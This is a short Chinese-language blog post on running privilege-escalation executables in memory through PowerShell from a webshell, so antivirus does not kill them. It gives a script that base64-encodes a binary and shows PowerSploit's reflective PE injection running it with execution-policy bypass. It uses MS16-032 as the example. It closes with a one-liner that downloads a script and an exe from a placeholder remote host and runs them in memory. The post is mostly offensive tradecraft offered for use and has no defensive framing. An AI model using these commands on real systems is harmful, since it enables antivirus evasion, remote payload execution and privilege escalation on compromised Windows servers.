Title: powershell加载exe到内存
Category: Tools
tag: powershell, windows
Date: 2017-6-2
slug: powershell-elf


环境:

上传提权的工具，运行等时候被杀，可以直接在webshell里面使用powershell加载exe到内存绕过。

<http://www.freebuf.com/articles/terminal/99631.html>


步骤:

###转换到base64

```
function Convert-BinaryToString {

   [CmdletBinding()] param (

      [string] $FilePath

   )

   try {

      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);

   }

   catch {

      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";

   }

   if ($ByteArray) {

      $Base64String = [System.Convert]::ToBase64String($ByteArray);

   }

   else {

      throw '$ByteArray is $null.';

   }

   Write-Output -InputObject $Base64String;

}
```
将这个文件保存为exe2base64.ps1, 使用powershell加载，

```
. .\exe2base.ps1
Convert-BinaryToString [path of exe] > res.txt
```
这里的exe需要绝对路径，因为一般来说转换之后的结果都比较大，所以重定向到文件比较好



###加载执行

<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1> 


脚本下载下来，打开之后加上:

```
$InputString = '...........'
# 将二进制字符串转为字节数组

$PEBytes = [System.Convert]::FromBase64String($InputString)

# 在内存中运行 EXE

Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

```

然后在webshell里面可以直接提权:

powershell -exec bypass -File payload.ps1

注意坑点：

拿ms16-032.exe来说，运行到时候如果直接把命令放到`-ExeArgs "Arg1 Arg2" 里面的话TM竟然会只执行第一个，空格之后就失败。

所以解决方法很简单: `-ExeArgs '"whoami /all"'` 单引号加上双引号

----

<https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1> 
这个可以使用PEUrl选项，直接远程加载exe，可以在webshell里面直接执行：

```
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/pe.ps1');Invoke-ReflectivePEInjection -PEUrl http://x.x.x.x/16-032.exe -ExeArgs 'whoami' -ForceASLR"  

```

